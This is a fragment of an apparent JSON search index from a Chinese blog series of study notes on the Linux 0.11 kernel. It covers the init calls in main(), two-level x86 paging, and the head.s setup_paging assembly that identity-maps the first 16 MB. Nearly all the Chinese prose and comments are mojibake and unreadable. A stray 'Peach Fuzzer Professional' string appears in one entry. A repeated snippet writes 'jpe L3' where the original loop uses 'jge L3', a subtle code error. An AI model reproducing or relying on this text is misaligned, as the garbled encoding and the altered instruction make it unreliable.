buffer_memory_end = 2*1024*1024; else buffer_memory_end = 1*1024*1024;// å¦åˆ™åˆ™è®¾ç½®ç¼“å†²åŒºæœ«ç«¯=1Mb main_memory_start = buffer_memory_end;// ä¸»å†…å­˜èµ·å§‹ä½ç½®=ç¼“å†²åŒºæœ«ç«¯ï¼› #ifdef RAMDISK // å¦‚æœå®šä¹‰äº†è™šæ‹Ÿç›˜ï¼Œåˆ™ä¸»å†…å­˜å°†å‡å°‘ã€‚ main_memory_start += rd_init(main_memory_start, RAMDISK*1024); #endif // ä»¥ä¸‹æ˜¯å†…æ ¸è¿›è¡Œæ‰€æœ‰æ–¹é¢çš„åˆå§‹åŒ–å·¥ä½œã€‚é˜…è¯»æ—¶æœ€å¥½è·Ÿç€è°ƒç”¨çš„ç¨‹åºæ·±å…¥è¿›å»çœ‹ï¼Œå®åœ¨çœ‹ // ä¸ä¸‹å»äº†ï¼Œå°±å…ˆæ”¾ä¸€æ”¾ï¼Œçœ‹ä¸‹ä¸€ä¸ªåˆå§‹åŒ–è°ƒç”¨-- è¿™æ˜¯ç»éªŒä¹‹è°ˆ:) mem_init(main_memory_start,memory_end); trap_init(); // é™·é˜±é—¨ï¼ˆç¡¬ä»¶ä¸­æ–­å‘é‡ï¼‰åˆå§‹åŒ–ã€‚ï¼ˆkernel/traps.cï¼‰ blk_dev_init(); // å—è®¾å¤‡åˆå§‹åŒ–ã€‚ï¼ˆkernel/blk_dev/ll_rw_blk.cï¼‰ chr_dev_init(); // å­—ç¬¦è®¾å¤‡åˆå§‹åŒ–ã€‚ï¼ˆkernel/chr_dev/tty_io.cï¼‰ç©ºï¼Œä¸ºä»¥åæ‰©å±•åšå‡†å¤‡ã€‚ tty_init(); // tty åˆå§‹åŒ–ã€‚ï¼ˆkernel/chr_dev/tty_io.cï¼‰ time_init(); // è®¾ç½®å¼€æœºå¯åŠ¨æ—¶é—´ -\u003e startup_timeã€‚ sched_init(); // è°ƒåº¦ç¨‹åºåˆå§‹åŒ–(åŠ è½½äº†ä»»åŠ¡0 çš„tr, ldtr) ï¼ˆkernel/sched.cï¼‰ buffer_init(buffer_memory_end);// ç¼“å†²ç®¡ç†åˆå§‹åŒ–ï¼Œå»ºå†…å­˜é“¾è¡¨ç­‰ã€‚ï¼ˆfs/buffer.cï¼‰ hd_init(); // ç¡¬ç›˜åˆå§‹åŒ–ã€‚ï¼ˆkernel/blk_dev/hd.cï¼‰ floppy_init(); // è½¯é©±åˆå§‹åŒ–ã€‚ï¼ˆkernel/blk_dev/floppy.cï¼‰ sti(); // æ‰€æœ‰åˆå§‹åŒ–å·¥ä½œéƒ½åšå®Œäº†ï¼Œå¼€å¯ä¸­æ–­ã€‚ // ä¸‹é¢è¿‡ç¨‹é€šè¿‡åœ¨å †æ ˆä¸­è®¾ç½®çš„å‚æ•°ï¼Œåˆ©ç”¨ä¸­æ–­è¿”å›æŒ‡ä»¤åˆ‡æ¢åˆ°ä»»åŠ¡0ã€‚ move_to_user_mode(); // ç§»åˆ°ç”¨æˆ·æ¨¡å¼ã€‚ï¼ˆinclude/asm/system.hï¼‰ if (!fork()) { /* we count on this going ok */ init(); } /* * æ³¨æ„!! å¯¹äºä»»ä½•å…¶å®ƒçš„ä»»åŠ¡ï¼Œ'pause()'å°†æ„å‘³ç€æˆ‘ä»¬å¿…é¡»ç­‰å¾…æ”¶åˆ°ä¸€ä¸ªä¿¡å·æ‰ä¼šè¿” * å›å°±ç»ªè¿è¡Œæ€ï¼Œä½†ä»»åŠ¡0ï¼ˆtask0ï¼‰æ˜¯å”¯ä¸€çš„æ„å¤–æƒ…å†µï¼ˆå‚è§'schedule()'ï¼‰ï¼Œå› ä¸ºä»» * åŠ¡0 åœ¨ä»»ä½•ç©ºé—²æ—¶é—´é‡Œéƒ½ä¼šè¢«æ¿€æ´»ï¼ˆå½“æ²¡æœ‰å…¶å®ƒä»»åŠ¡åœ¨è¿è¡Œæ—¶ï¼‰ï¼Œ * å› æ­¤å¯¹äºä»»åŠ¡0'pause()'ä»…æ„å‘³ç€æˆ‘ä»¬è¿”å›æ¥æŸ¥çœ‹æ˜¯å¦æœ‰å…¶å®ƒä»»åŠ¡å¯ä»¥è¿è¡Œï¼Œå¦‚æœæ²¡ * æœ‰çš„è¯æˆ‘ä»¬å°±å›åˆ°è¿™é‡Œï¼Œä¸€ç›´å¾ªç¯æ‰§è¡Œ'pause()'ã€‚ */ for(;;) pause(); } // end main æ•´ä¸ªOSä¼šæœ€ç»ˆåœç•™åœ¨æœ€åä¸€è¡Œçš„æ­»å¾ªç¯ä¸­ï¼Œæ°¸ä¸è¿”å›ï¼Œç›´åˆ°å…³æœºã€‚ è‡³æ­¤ï¼Œè¿›å…¥ main å‡½æ•°çš„å‡†å¤‡å·¥ä½œå·²ç»å…¨éƒ¨å®Œæˆäº†ï¼Œå‰é¢æˆ‘ä»¬åšçš„æ‰€æœ‰å·¥ä½œå¦‚ä¸‹ï¼š æ­¤æ—¶çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š ç„¶åè¿›å…¥åˆ° main å‡½æ•°ä¸­ç»§ç»­æ‰§è¡Œã€‚ ","date":"2021-12-20","objectID":"/2021/12/linux-0.11-07/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-07","uri":"/2021/12/linux-0.11-07/"},{"categories":["LINUX"],"content":"ç¬¬ä¸€éƒ¨åˆ†æ€»ç»“ æˆªæ­¢åˆ°è¿™ä¸€ç¯‡ä½ç½®ï¼Œç¬¬ä¸€éƒ¨åˆ†å·²ç»å…¨éƒ¨å®Œæˆï¼Œåœ¨è¿›å…¥ main.c ä¹‹å‰çš„æ‰€æœ‰å·¥ä½œéƒ½å·²ç»å®Œæˆï¼Œæ¥ä¸‹æ¥çš„è¿è¡Œå°±å¼€å§‹è¿è¡Œ main å‡½æ•°äº†ã€‚ ç”±äºè¿™ä¸€éƒ¨åˆ†å¤§éƒ¨åˆ†éƒ½æ˜¯åœ¨å’Œ Intel CPU æ‰“äº¤é“ï¼Œæ‰€ä»¥å‚è€ƒèµ„æ–™å¤§éƒ¨åˆ†æ˜¯ Intel æ‰‹å†Œï¼š ","date":"2021-12-20","objectID":"/2021/12/linux-0.11-07/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-07","uri":"/2021/12/linux-0.11-07/"},{"categories":["LINUX"],"content":"é—ªå®¢Linuxæ“ä½œç³»ç»Ÿç³»åˆ—ç¬¬å…­ç¯‡","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"Peach Fuzzer Professionalæœ¬æ–‡æ˜¯Linux 0.11ç³»åˆ—å­¦ä¹ è®°å½•çš„æ­£å¼çš„ç¬¬å…­ç¯‡ã€‚ ä»æœ¬ç¯‡å¼€å§‹ï¼Œåœ¨æ¯ç¯‡æ–‡ç« ä¸­ä¼šåŠ å…¥è‡ªå·±çš„ç†è§£å’Œè¡¥å……ï¼Œå„ä½å¯æŒ‰éœ€æŸ¥çœ‹ã€‚ ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"09 Intel çš„å†…å­˜ç®¡ç†ï¼šåˆ†æ®µä¸åˆ†é¡µ ä¸Šæ–‡è¯´åˆ° head.s ä»£ç åœ¨é‡æ–°è®¾ç½®äº† gdt å’Œ idt ä¹‹åï¼Œæ­¤æ—¶çš„å†…å­˜åˆ†å¸ƒå¦‚ä¸‹ï¼š ç„¶åå¾…æ‰§è¡Œçš„ä»£ç å¦‚ä¸‹ï¼š jmp after_page_tables ... after_page_tables: push 0 push 0 push 0 push L6 ; æ¨¡æ‹Ÿè°ƒç”¨ mainc.c ç¨‹åºæ—¶é¦–å…ˆå°†è¿”å›åœ°å€å…¥æ ˆçš„æ“ä½œï¼Œmain.cé€€å‡ºæ—¶ï¼Œä¼šè¿”å›åˆ° L6ï¼Œä»è€Œè¿›å…¥æ­»å¾ªç¯ push _main ; main.c åœ°å€å…¥æ ˆï¼Œè¿™æ ·åœ¨è®¾ç½®åˆ†é¡µå¤„ç†ç»“æŸåï¼Œæ‰§è¡Œ ret æ—¶ä¼šå°† main.c åœ°å€ pop å‡ºæ¥ï¼Œä»è€Œå»æ‰§è¡Œ main.c jmp setup_paging L6: jmp L6 ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"1. åˆ†é¡µæœºåˆ¶ åœ¨å‰é¢æœ‰ä»‹ç»ï¼Œåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œè¦å…ˆç»è¿‡åˆ†æ®µæœºåˆ¶çš„è½¬æ¢æ‰èƒ½å˜æˆç‰©ç†åœ°å€ï¼š åœ¨æ²¡æœ‰å¼€å¯åˆ†é¡µçš„æ—¶å€™ï¼Œåˆ†æ®µæœºåˆ¶å›é¡¾ï¼š åˆ†æ®µæœºåˆ¶æ¶‰åŠçš„4ä¸ªå…³é”®å†…å®¹ï¼šé€»è¾‘åœ°å€ã€æ®µæè¿°ç¬¦ï¼ˆæè¿°æ®µçš„å±æ€§ï¼‰ã€æ®µæè¿°ç¬¦è¡¨ï¼ˆåŒ…å«å¤šä¸ªæ®µæè¿°ç¬¦çš„â€œæ•°ç»„â€ï¼‰ã€æ®µé€‰æ‹©å­ï¼ˆæ®µå¯„å­˜å™¨ï¼Œç”¨äºå®šä½æ®µæè¿°ç¬¦è¡¨ä¸­è¡¨é¡¹çš„ç´¢å¼•ï¼‰ã€‚ è½¬æ¢é€»è¾‘åœ°å€åˆ°ç‰©ç†åœ°å€åˆ†è¿‡ç¨‹å¦‚ä¸‹ï¼šCPUæŠŠé€»è¾‘åœ°å€ï¼ˆç”±æ®µé€‰æ‹©å­selectorå’Œæ®µåç§»offsetç»„æˆï¼‰ä¸­çš„æ®µé€‰æ‹©å­çš„å†…å®¹ä½œä¸ºæ®µæè¿°ç¬¦è¡¨çš„ç´¢å¼•ï¼Œæ‰¾åˆ°è¡¨ä¸­å¯¹åº”çš„æ®µæè¿°ç¬¦ï¼Œç„¶åæŠŠæ®µæè¿°ç¬¦ä¸­ä¿å­˜çš„æ®µåŸºå€åŠ ä¸Šæ®µåç§»å€¼ï¼Œå½¢æˆçº¿æ€§åœ°å€ã€‚ ä½†æ˜¯å¼€å¯åˆ†é¡µä¹‹åï¼Œä¼šå¤šä¸€æ­¥è½¬æ¢ï¼š å¯ä»¥çœ‹åˆ°ï¼Œåœ¨å¼€å¯åˆ†é¡µåï¼Œé€»è¾‘åœ°å€ç»è¿‡åˆ†æ®µæœºåˆ¶çš„è½¬æ¢åï¼Œä¸ä¼šç›´æ¥è·å¾—ç‰©ç†åœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªçº¿æ€§åœ°å€ï¼Œç„¶åéœ€è¦å†é€šè¿‡ä¸€æ¬¡åˆ†é¡µæœºåˆ¶è½¬æ¢æ‰èƒ½å¾—åˆ°æœ€ç»ˆçš„ç‰©ç†åœ°å€ï¼Œæ­¤æ—¶å…¶è¿‡ç¨‹å¦‚ä¸‹ï¼š è€Œå¯¹äºä»çº¿æ€§åœ°å€åˆ°åˆ†é¡µç‰©ç†åœ°å€çš„è½¬æ¢è¿‡ç¨‹å¦‚ä¸‹ï¼ˆä½¿ç”¨32-bitåˆ†é¡µæœºåˆ¶ï¼‰ï¼š ä»¥4Ké¡µä¸ºä¾‹ï¼Œçº¿æ€§åœ°å€çš„å‰10ä½è¡¨ç¤ºé¡µè¡¨ç›®å½•ï¼Œä¸­é—´10ä½è¡¨ç¤ºé¡µè¡¨é¡¹ï¼Œæœ€å12ä½è¡¨ç¤ºé¡µå†…åç§»ã€‚ é¦–å…ˆæ ¹æ®é«˜10ä½åœ¨é¡µç›®å½•è¡¨ä¸­æ‰¾åˆ°ä¸€ä¸ªé¡µç›®å½•é¡¹ï¼Œè¿™ä¸ªé¡µç›®å½•é¡¹çš„å€¼åŠ ä¸Šä¸­é—´10ä½æ‹¼æ¥åçš„åœ°å€å»é¡µè¡¨ä¸­å¯»æ‰¾ä¸€ä¸ªé¡µè¡¨é¡¹ï¼Œè¿™ä¸ªé¡µè¡¨é¡¹çš„å€¼å†åŠ ä¸Šå12ä½çš„åç§»åœ°å€ï¼Œå°±æ˜¯æœ€ç»ˆçš„ç‰©ç†åœ°å€ã€‚ æ¥ä¸‹æ¥ä»¥ä¸€ä¸ªä¾‹å­æ¥æ„Ÿå—åˆ†é¡µæœºåˆ¶ï¼š å‡è®¾ç»è¿‡åˆ†æ®µæœºåˆ¶è½¬æ¢åçš„çº¿æ€§åœ°å€æ˜¯15Mï¼ŒäºŒè¿›åˆ¶è¡¨ç¤ºä¸º 0000000011_0100000000_000000000000ï¼Œå…¶è½¬æ¢è¿‡ç¨‹å¦‚ä¸‹ï¼š ä¸Šè¿°ç®¡è½¬æ¢è¿‡ç¨‹çš„æ“ä½œç”±MMUä¹Ÿå°±æ˜¯å†…å­˜ç®¡ç†å•å…ƒå®Œæˆï¼Œå…¶ä¸»è¦ä½œç”¨å°±æ˜¯å°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ã€‚æ‰€ä»¥æ•´ä¸ªè¿‡ç¨‹OSä½œä¸ºè½¯ä»¶å±‚ï¼Œåªéœ€è¦æä¾›å¥½é¡µç›®å½•è¡¨å’Œé¡µè¡¨å³å¯ï¼Œè¿™ç§é¡µè¡¨æ–¹æ¡ˆå«åšäºŒçº§é¡µè¡¨ï¼Œç¬¬ä¸€çº§å«åšé¡µç›®å½•è¡¨PDEï¼Œç¬¬äºŒçº§å«åšé¡µè¡¨PTEï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š ä¹‹åå†å¼€å¯åˆ†é¡µæœºåˆ¶çš„å¼€å…³ï¼Œå…¶å®å°±æ˜¯æ›´æ”¹ cr0 å¯„å­˜å™¨ä¸­çš„ç¬¬31ä½å³å¯ã€‚åœ¨å¼€å§‹ä¿æŠ¤æ¨¡å¼æ—¶ï¼Œä¹Ÿæ˜¯æ›´æ”¹è¯¥å¯„å­˜å™¨ä¸­çš„ç¬¬0ä½çš„å€¼ï¼š ç„¶åï¼ŒMMU å°±å¯ä»¥å¸®æˆ‘ä»¬è¿›è¡Œåˆ†é¡µçš„è½¬æ¢äº†ã€‚æ­¤åæŒ‡ä»¤ä¸­çš„å†…å­˜åœ°å€ï¼ˆå°±æ˜¯ç¨‹åºå‘˜æä¾›çš„é€»è¾‘åœ°å€ï¼‰ï¼Œå°±ç»Ÿç»Ÿè¦å…ˆç»è¿‡åˆ†æ®µæœºåˆ¶çš„è½¬æ¢ï¼Œå†é€šè¿‡åˆ†é¡µæœºåˆ¶çš„è½¬æ¢ï¼Œæ‰èƒ½æœ€ç»ˆå˜æˆç‰©ç†åœ°å€ã€‚ ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:1:1","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"2. å¼€å¯åˆ†é¡µæœºåˆ¶ ä¸‹é¢çœ‹åˆ†é¡µæœºåˆ¶å¦‚ä½•å¼€å¯ï¼Œä¹Ÿå°±æ˜¯ setup_paging éƒ¨åˆ†ï¼Œä¸»è¦æ˜¯å¸®æˆ‘ä»¬æŠŠé¡µè¡¨å’Œé¡µç›®å½•è¡¨åœ¨å†…å­˜ä¸­å†™å¥½ï¼Œç„¶åå¼€å¯ cr0 å¯„å­˜å™¨çš„åˆ†é¡µå¼€å…³ï¼š ;/* ; * Setup_paging ; * ; * è¿™ä¸ªå­ç¨‹åºé€šè¿‡è®¾ç½®æ§åˆ¶å¯„å­˜å™¨cr0 çš„æ ‡å¿—ï¼ˆPG ä½31ï¼‰æ¥å¯åŠ¨å¯¹å†…å­˜çš„åˆ†é¡µå¤„ç† ; * åŠŸèƒ½ï¼Œå¹¶è®¾ç½®å„ä¸ªé¡µè¡¨é¡¹çš„å†…å®¹ï¼Œä»¥æ’ç­‰æ˜ å°„å‰16 MB çš„ç‰©ç†å†…å­˜ã€‚åˆ†é¡µå™¨å‡å®š ; * ä¸ä¼šäº§ç”Ÿéæ³•çš„åœ°å€æ˜ å°„ï¼ˆä¹Ÿå³åœ¨åªæœ‰4Mb çš„æœºå™¨ä¸Šè®¾ç½®å‡ºå¤§äº4Mb çš„å†…å­˜åœ°å€ï¼‰ã€‚ ; * ; * æ³¨æ„ï¼å°½ç®¡æ‰€æœ‰çš„ç‰©ç†åœ°å€éƒ½åº”è¯¥ç”±è¿™ä¸ªå­ç¨‹åºè¿›è¡Œæ’ç­‰æ˜ å°„ï¼Œä½†åªæœ‰å†…æ ¸é¡µé¢ç®¡ ; * ç†å‡½æ•°èƒ½ç›´æ¥ä½¿ç”¨\u003e1Mb çš„åœ°å€ã€‚æ‰€æœ‰â€œä¸€èˆ¬â€å‡½æ•°ä»…ä½¿ç”¨ä½äº1Mb çš„åœ°å€ç©ºé—´ï¼Œæˆ– ; * è€…æ˜¯ä½¿ç”¨å±€éƒ¨æ•°æ®ç©ºé—´ï¼Œåœ°å€ç©ºé—´å°†è¢«æ˜ å°„åˆ°å…¶å®ƒä¸€äº›åœ°æ–¹å»-- mm(å†…å­˜ç®¡ç†ç¨‹åº) ; * ä¼šç®¡ç†è¿™äº›äº‹çš„ã€‚ ; */ align 2 ;// æŒ‰4 å­—èŠ‚æ–¹å¼å¯¹é½å†…å­˜åœ°å€è¾¹ç•Œã€‚ setup_paging: ;// é¦–å…ˆå¯¹5 é¡µå†…å­˜ï¼ˆ1 é¡µç›®å½•+ 4 é¡µé¡µè¡¨ï¼‰æ¸…é›¶ mov ecx,1024*5 ;/* 5 pages - pg_dir+4 page tables */ xor eax,eax xor edi,edi ;/* pg_dir is at 0x000 */ ;// é¡µç›®å½•ä»0x000 åœ°å€å¼€å§‹ã€‚ pushf ;// VCå†…æ±‡ç¼–ä½¿ç”¨cldå’Œstdåï¼Œéœ€è¦è‡ªå·±æ¢å¤DFçš„å€¼ cld rep stosd ;// ä¸‹é¢4 å¥è®¾ç½®é¡µç›®å½•ä¸­çš„é¡¹ï¼Œæˆ‘ä»¬å…±æœ‰4 ä¸ªé¡µè¡¨æ‰€ä»¥åªéœ€è®¾ç½®4 é¡¹ã€‚ ;// é¡µç›®å½•é¡¹çš„ç»“æ„ä¸é¡µè¡¨ä¸­é¡¹çš„ç»“æ„ä¸€æ ·ï¼Œ4 ä¸ªå­—èŠ‚ä¸º1 é¡¹ã€‚å‚è§ä¸Šé¢çš„è¯´æ˜ã€‚ ;// \"$pg0+7\"è¡¨ç¤ºï¼š0x00001007ï¼Œæ˜¯é¡µç›®å½•è¡¨ä¸­çš„ç¬¬1 é¡¹ã€‚ ;// åˆ™ç¬¬1 ä¸ªé¡µè¡¨æ‰€åœ¨çš„åœ°å€= 0x00001007 \u0026 0xfffff000 = 0x1000ï¼›ç¬¬1 ä¸ªé¡µè¡¨ ;// çš„å±æ€§æ ‡å¿—= 0x00001007 \u0026 0x00000fff = 0x07ï¼Œè¡¨ç¤ºè¯¥é¡µå­˜åœ¨ã€ç”¨æˆ·å¯è¯»å†™ã€‚ mov eax,_pg_dir mov [eax],pg0+7 ;/* set present bit/user r/w */ mov [eax+4],pg1+7 ;/* --------- \" \" --------- */ mov [eax+8],pg2+7 ;/* --------- \" \" --------- */ mov [eax+12],pg3+7 ;/* --------- \" \" --------- */ ;// ä¸‹é¢6 è¡Œå¡«å†™4 ä¸ªé¡µè¡¨ä¸­æ‰€æœ‰é¡¹çš„å†…å®¹ï¼Œå…±æœ‰ï¼š4(é¡µè¡¨)*1024(é¡¹/é¡µè¡¨)=4096 é¡¹(0 - 0xfff)ï¼Œ ;// ä¹Ÿå³èƒ½æ˜ å°„ç‰©ç†å†…å­˜4096*4Kb = 16Mbã€‚ ;// æ¯é¡¹çš„å†…å®¹æ˜¯ï¼šå½“å‰é¡¹æ‰€æ˜ å°„çš„ç‰©ç†å†…å­˜åœ°å€+ è¯¥é¡µçš„æ ‡å¿—ï¼ˆè¿™é‡Œå‡ä¸º7ï¼‰ã€‚ ;// ä½¿ç”¨çš„æ–¹æ³•æ˜¯ä»æœ€åä¸€ä¸ªé¡µè¡¨çš„æœ€åä¸€é¡¹å¼€å§‹æŒ‰å€’é€€é¡ºåºå¡«å†™ã€‚ä¸€ä¸ªé¡µè¡¨çš„æœ€åä¸€é¡¹ ;// åœ¨é¡µè¡¨ä¸­çš„ä½ç½®æ˜¯1023*4 = 4092ã€‚å› æ­¤æœ€åä¸€é¡µçš„æœ€åä¸€é¡¹çš„ä½ç½®å°±æ˜¯$pg3+4092ã€‚ mov edi,pg3+4092 ;// edi -\u003e æœ€åä¸€é¡µçš„æœ€åä¸€é¡¹ã€‚ mov eax,00fff007h ;/* 16Mb - 4096 + 7 (r/w user,p) */ ;// æœ€å1 é¡¹å¯¹åº”ç‰©ç†å†…å­˜é¡µé¢çš„åœ°å€æ˜¯0xfff000ï¼Œ ;// åŠ ä¸Šå±æ€§æ ‡å¿—7ï¼Œå³ä¸º0xfff007. std ;// æ–¹å‘ä½ç½®ä½ï¼Œedi å€¼é€’å‡(4 å­—èŠ‚)ã€‚ L3: stosd ;/* fill pages backwards - more efficient :-) */ sub eax,00001000h ;// æ¯å¡«å†™å¥½ä¸€é¡¹ï¼Œç‰©ç†åœ°å€å€¼å‡0x1000ã€‚ jge L3 ;// å¦‚æœå°äº0 åˆ™è¯´æ˜å…¨æ·»å†™å¥½äº†ã€‚ popf ;// è®¾ç½®é¡µç›®å½•åŸºå€å¯„å­˜å™¨cr3 çš„å€¼ï¼ŒæŒ‡å‘é¡µç›®å½•è¡¨ã€‚ xor eax,eax ;/* é¡µç›®å½•è¡¨(pg_dir)åœ¨0x0000 å¤„ã€‚ */ mov cr3,eax ;/* cr3 - page directory start */ ;// è®¾ç½®å¯åŠ¨ä½¿ç”¨åˆ†é¡µå¤„ç†ï¼ˆcr0 çš„PG æ ‡å¿—ï¼Œä½31ï¼‰ mov eax,cr0 or eax,80000000h ;// æ·»ä¸ŠPG æ ‡å¿—ã€‚ mov cr0,eax ;/* set paging (PG) bit */ ret ;/* this also flushes prefetch-queue */ ;// åœ¨æ”¹å˜åˆ†é¡µå¤„ç†æ ‡å¿—åè¦æ±‚ä½¿ç”¨è½¬ç§»æŒ‡ä»¤åˆ·æ–°é¢„å–æŒ‡ä»¤é˜Ÿåˆ—ï¼Œè¿™é‡Œç”¨çš„æ˜¯è¿”å›æŒ‡ä»¤retã€‚ ;// è¯¥è¿”å›æŒ‡ä»¤çš„å¦ä¸€ä¸ªä½œç”¨æ˜¯å°†å †æ ˆä¸­çš„main ç¨‹åºçš„åœ°å€å¼¹å‡ºï¼Œå¹¶å¼€å§‹è¿è¡Œ/init/main.c ;// ç¨‹åºã€‚æœ¬ç¨‹åºåˆ°æ­¤çœŸæ­£ç»“æŸäº†ã€‚ å½“æ—¶ linux-0.11 è®¤ä¸ºï¼Œæ€»å…±å¯ä»¥ä½¿ç”¨çš„å†…å­˜ä¸ä¼šè¶…è¿‡ 16Mï¼Œä¹Ÿå³æœ€å¤§åœ°å€ç©ºé—´ä¸º 0xFFFFFFã€‚è€ŒæŒ‰ç…§å½“å‰çš„é¡µç›®å½•è¡¨å’Œé¡µè¡¨è¿™ç§æœºåˆ¶ï¼Œ1 ä¸ªé¡µç›®å½•è¡¨æœ€å¤šåŒ…å« 1024 ä¸ªé¡µç›®å½•é¡¹ï¼ˆä¹Ÿå°±æ˜¯ 1024 ä¸ªé¡µè¡¨ï¼‰ï¼Œ1 ä¸ªé¡µè¡¨æœ€å¤šåŒ…å« 1024 ä¸ªé¡µè¡¨é¡¹ï¼ˆä¹Ÿå°±æ˜¯ 1024 ä¸ªé¡µï¼‰ï¼Œ1 é¡µä¸º 4KBï¼ˆå› ä¸ºæœ‰ 12 ä½åç§»åœ°å€ï¼‰ï¼Œå› æ­¤ï¼Œ16M çš„åœ°å€ç©ºé—´å¯ä»¥ç”¨ 1 ä¸ªé¡µç›®å½•è¡¨ + 4 ä¸ªé¡µè¡¨æå®šã€‚ 4ï¼ˆé¡µè¡¨æ•°ï¼‰* 1024ï¼ˆé¡µè¡¨é¡¹æ•°ï¼‰ * 4KBï¼ˆä¸€é¡µå¤§å°ï¼‰= 16MB æ‰€ä»¥ï¼Œä¸Šé¢è¿™æ®µä»£ç å°±æ˜¯ï¼Œå°†é¡µç›®å½•è¡¨æ”¾åœ¨å†…å­˜åœ°å€çš„æœ€å¼€å¤´ã€‚ _pg_dir: _startup_32: mov eax,0x10 mov ds,ax .. ä¹‹åç´§æŒ¨ç€è¿™ä¸ªé¡µç›®å½•è¡¨ï¼Œæ”¾ç½® 4 ä¸ªé¡µè¡¨ï¼Œä»£ç é‡Œä¹Ÿæœ‰è¿™å››ä¸ªé¡µè¡¨çš„æ ‡ç­¾é¡¹ã€‚ .org 0x1000 pg0: .org 0x2000 pg1: .org 0x3000 pg2: .org 0x4000 pg3: .org 0x5000 æœ€ç»ˆå°†é¡µç›®å½•è¡¨å’Œé¡µè¡¨å¡«å†™å¥½æ•°å€¼ï¼Œæ¥è¦†ç›–æ•´ä¸ª 16MB çš„å†…å­˜ã€‚éšåï¼Œå¼€å¯åˆ†é¡µæœºåˆ¶ã€‚æ­¤æ—¶å†…å­˜ä¸­çš„é¡µè¡¨ç›¸å…³çš„å¸ƒå±€å¦‚ä¸‹ã€‚ è¿™äº›é¡µç›®å½•è¡¨å’Œé¡µè¡¨æ”¾åˆ°äº†æ•´ä¸ªå†…å­˜å¸ƒå±€ä¸­æœ€å¼€å¤´çš„ä½ç½®ï¼Œå°±æ˜¯è¦†ç›–äº†å¼€å¤´çš„ system ä»£ç äº†ï¼Œä¸è¿‡è¢«è¦†ç›–çš„ system ä»£ç å·²ç»æ‰§è¡Œè¿‡äº†ï¼Œæ‰€ä»¥æ— æ‰€è°“ã€‚åŒæ—¶ï¼Œå¦‚ idt å’Œ gdt ä¸€æ ·ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦é€šè¿‡ä¸€ä¸ªå¯„å­˜å™¨å‘Šè¯‰ CPU æˆ‘ä»¬æŠŠè¿™äº›é¡µè¡¨æ”¾åœ¨äº†å“ªé‡Œï¼Œå°±æ˜¯è¿™æ®µä»£ç ã€‚ xor eax,eax mov cr3,eax æˆ‘ä»¬ç›¸å½“äºå‘Šè¯‰ cr3 å¯„å­˜å™¨ï¼Œ0 åœ°å€å¤„å°±æ˜¯é¡µç›®å½•è¡¨ï¼Œå†é€šè¿‡é¡µç›®å½•è¡¨å¯ä»¥æ‰¾åˆ°æ‰€æœ‰çš„é¡µè¡¨ï¼Œä¹Ÿå°±ç›¸å½“äº CPU çŸ¥é“äº†åˆ†é¡µæœºåˆ¶çš„å…¨è²Œäº†ã€‚ è‡³æ­¤åï¼Œæ•´ä¸ªå†…å­˜å¸ƒå±€å¦‚ä¸‹ã€‚ é‚£ä¹ˆå…·ä½“é¡µè¡¨è®¾ç½®å¥½åï¼Œæ˜ å°„çš„å†…å­˜æ˜¯æ€æ ·çš„æƒ…å†µå‘¢ï¼Ÿé‚£å°±è¦çœ‹é¡µè¡¨çš„å…·ä½“æ•°æ®äº†ï¼Œå°±æ˜¯è¿™ä¸€å¨ä»£ç ã€‚ setup_paging: ... mov eax,_pg_dir mov [eax],pg0+7 mov [eax+4],pg1+7 mov [eax+8],pg2+7 mov [eax+12],pg3+7 mov edi,pg3+4092 mov eax,00fff007h std L3: stosd sub eax, 1000h jpe L3 ... å¾ˆç®€å•ï¼Œå¯¹ç…§åˆšåˆšçš„é¡µç›®å½•è¡¨ä¸é¡µè¡¨ç»“æ„çœ‹ã€‚ å‰äº”è¡Œè¡¨ç¤ºï¼Œé¡µç›®å½•è¡¨çš„å‰ 4 ä¸ªé¡µç›®å½•é¡¹ï¼Œåˆ†åˆ«æŒ‡å‘ 4 ä¸ªé¡µè¡¨ã€‚æ¯”å¦‚é¡µç›®å½•é¡¹ä¸­çš„ç¬¬ä¸€é¡¹ [eax] è¢«èµ‹å€¼ä¸º pg0+7ï¼Œä¹Ÿå°±æ˜¯ 0x00001007ï¼Œæ ¹æ®é¡µç›®å½•é¡¹çš„æ ¼å¼ï¼Œè¡¨ç¤ºé¡µè¡¨åœ°å€ä¸º 0x1000ï¼Œé¡µå±æ€§ä¸º 0x07 è¡¨ç¤ºæ”¹é¡µå­˜åœ¨ã€ç”¨æˆ·å¯è¯»å†™ã€‚åé¢å‡ è¡Œè¡¨ç¤ºï¼Œå¡«å…… 4 ä¸ªé¡µè¡¨çš„æ¯ä¸€é¡¹ï¼Œä¸€å…± 4*1024=4096 é¡¹ï¼Œä¾æ¬¡æ˜ å°„åˆ°å†…å­˜çš„å‰ 16MB ç©ºé—´ã€‚ ç”»å‡ºå›¾å°±æ˜¯è¿™ä¸ªæ ·å­ï¼Œå…¶å®åˆšåˆšçš„å›¾å°±æ˜¯ã€‚ æœ€ç»ˆçš„æ•ˆæœå°±æ˜¯ï¼Œç»è¿‡è¿™å¥—åˆ†é¡µæœºåˆ¶ï¼Œçº¿æ€§åœ°å€å°†æ°å¥½å’Œæœ€ç»ˆè½¬æ¢çš„ç‰©ç†åœ°å€ä¸€æ ·ã€‚ ç°åœ¨åªæœ‰å››ä¸ªé¡µç›®å½•é¡¹ï¼Œä¹Ÿå°±æ˜¯å°†å‰ 16M 